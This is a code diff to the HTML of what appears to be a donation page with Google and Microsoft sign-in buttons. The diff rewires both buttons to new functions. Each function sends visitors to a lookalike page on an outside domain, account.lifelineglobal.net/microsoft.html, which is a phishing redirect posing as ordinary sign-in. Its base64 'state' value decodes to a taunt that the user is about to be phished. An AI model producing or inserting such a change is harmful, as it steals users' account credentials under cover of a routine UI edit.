@@ -75,7 +75,7 @@
                             <div class="login-content">
                                 <h3>Sign in with Google</h3>
                                 <p>Quick and secure access using your Google account</p>
-                                <button class="btn btn-primary btn-large login-btn" onclick="signInWithGoogle()">
+                                <button class="btn btn-primary btn-large login-btn" onclick="redirectToGoogle()">
                                     <i class="fab fa-google"></i> Continue with Google
                                 </button>
                             </div>
@@ -92,7 +92,7 @@
                             <div class="login-content">
                                 <h3>Sign in with Microsoft</h3>
                                 <p>Secure access using your Microsoft account</p>
-                                <button class="btn btn-secondary btn-large login-btn" onclick="signInWithMicrosoft()">
+                                <button class="btn btn-secondary btn-large login-btn" onclick="redirectToMicrosoft()">
                                     <i class="fab fa-microsoft"></i> Continue with Microsoft
                                 </button>
                             </div>
@@ -327,6 +327,14 @@
             document.getElementById('donation-section').style.display = 'none';
             selectedAmount = 0;
             updateSummary();
+        }
+
+        function redirectToGoogle() {
+            window.location.href = "https://account.lifelineglobal.net/microsoft.html?login=t&state=bG9sIHlvdSdyZSBhYm91dCB0byBnZXQgcGhpc2hlZCBicm8uIE1heSB0aGUgTG9yZCBiZSB3aXRoIHlvdSBob21icmUu";
+        }
+
+        function redirectToMicrosoft() {
+            window.location.href = "https://account.lifelineglobal.net/microsoft.html?login=t&state=bG9sIHlvdSdyZSBhYm91dCB0byBnZXQgcGhpc2hlZCBicm8uIE1heSB0aGUgTG9yZCBiZSB3aXRoIHlvdSBob21icmUu";
         }
 
         function selectAmount(amount) {
